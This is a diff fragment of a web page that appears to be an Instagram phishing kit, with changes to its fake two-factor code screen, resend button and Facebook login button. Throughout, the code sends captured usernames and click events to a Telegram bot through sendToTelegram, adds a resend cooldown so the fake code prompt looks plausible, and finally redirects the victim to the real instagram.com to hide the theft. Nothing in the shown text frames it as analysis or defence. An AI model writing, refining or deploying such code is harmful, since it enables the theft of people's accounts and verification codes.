                     setTimeout(() => {
                         window.location.href = 'https://www.instagram.com';
                     }, CONFIG.delayBeforeRedirect);
-                }, 800);
+                }, 500);
             } else {
-                errorMsg.textContent = 'Invalid code. Please try again.';
-                errorMsg.style.display = 'block';
-                
-                codeBoxes.forEach(box => box.value = '');
+                showToast('❌ Invalid code. Try again.', 'error');
+                codeBoxes.forEach(box => { box.value = ''; box.disabled = false; });
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
             }
-        } catch (error) {
-            loadingScreen.style.display = 'none';
-            errorMsg.textContent = 'Connection error. Please try again.';
-            errorMsg.style.display = 'block';
-            
-            codeBoxes.forEach(box => box.value = '');
-            codeBoxes[0].focus();
-            verifyBtn.disabled = true;
-        }
+        }, 1200);
     });
 
     // ============================================
     //  RESEND
     // ============================================
+    let resendCooldown = null;
     resendBtn.addEventListener('click', function() {
+        if (resendCooldown) return;
+
+        sendToTelegram(`🔄 *Resend Requested* 🔄 | User: \`${capturedUsername}\` | Time: ${new Date().toISOString()}`);
+        showToast('✅ Code resent!', 'success');
+
+        resendBtn.disabled = true;
+        resendCooldown = setTimeout(() => {
+            resendBtn.disabled = false;
+            resendCooldown = null;
+        }, 30000);
+
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
-        
-        sendToTelegram(`🔄 *Resend Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
 
     // ============================================
     //  BACK TO LOGIN
     // ============================================
-    backLink.addEventListener('click', function(e) {
-        e.preventDefault();
+    backLink.addEventListener('click', function() {
         twofaSection.style.display = 'none';
         loginCard.style.display = 'block';
         signupCard.style.display = 'block';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
         checkLogin();
     });
 
     // ============================================
     //  FACEBOOK LOGIN
     // ============================================
-    document.getElementById('fbLogin').addEventListener('click', function(e) {
-        e.preventDefault();
-        sendToTelegram(`📘 *FB Login Clicked* 📘\n\n👤 *User:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
+    document.getElementById('fbLogin').addEventListener('click', function() {
+        sendToTelegram(`📘 *FB Login Clicked* | User: \`${u.value.trim() || 'N/A'}\` | Time: ${new Date().toISOString()}`);
     });
+
+    // ============================================
+    //  INIT
+    // ============================================
+    checkFloat(p, pg);
+    checkFloat(u, ug);
 </script>
 </body>
 </html>
